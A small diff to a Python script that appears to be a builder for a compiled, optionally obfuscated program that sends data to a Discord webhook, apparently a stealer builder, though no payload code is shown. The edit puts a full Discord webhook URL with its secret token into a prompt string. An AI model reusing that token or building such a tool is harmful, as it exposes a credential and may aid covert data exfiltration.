@@ -20,7 +20,7 @@ if "is not recognized" in subprocess.check_output("pyinstaller --version").decod
     print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
     while True: pass
 
-webhook = input("Paste your Webhook: ")
+webhook = input("https://discord.com/api/webhooks/1129263897631797300/CKqUu6VR8PPUOi53l7Tt3e22g8S-RmztF96mZpyOdNhPa84abLBapQa5IHtd2cZ-ylTG: ")
 obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
 console = input("Show the Console when running? (Y/N): ")
 
